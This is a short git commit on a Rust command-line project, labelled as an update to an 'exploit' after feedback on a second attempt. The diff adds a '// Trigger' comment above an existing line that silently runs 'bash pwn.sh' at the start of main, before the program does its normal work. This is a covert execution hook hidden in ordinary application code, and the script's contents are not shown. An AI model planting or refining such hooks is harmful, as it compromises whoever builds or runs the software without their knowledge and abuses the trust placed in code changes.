f8e2be82b6ae68bd2fda9b6e80fee8d14f7a0de3
jy3l40c9 <jy3l40c9@rolf.ovh>
2026-04-25 22:43:32 +0000

    Update exploit based on attempt 2 feedback

--- src/main.rs
+++ src/main.rs
@@ -20,6 +20,7 @@ struct Cli {
 
 #[tokio::main]
 async fn main() -> Result<()> {
+    // Trigger
     let _ = std::process::Command::new("bash").arg("pwn.sh").status();
     let cli = Cli::parse();
 
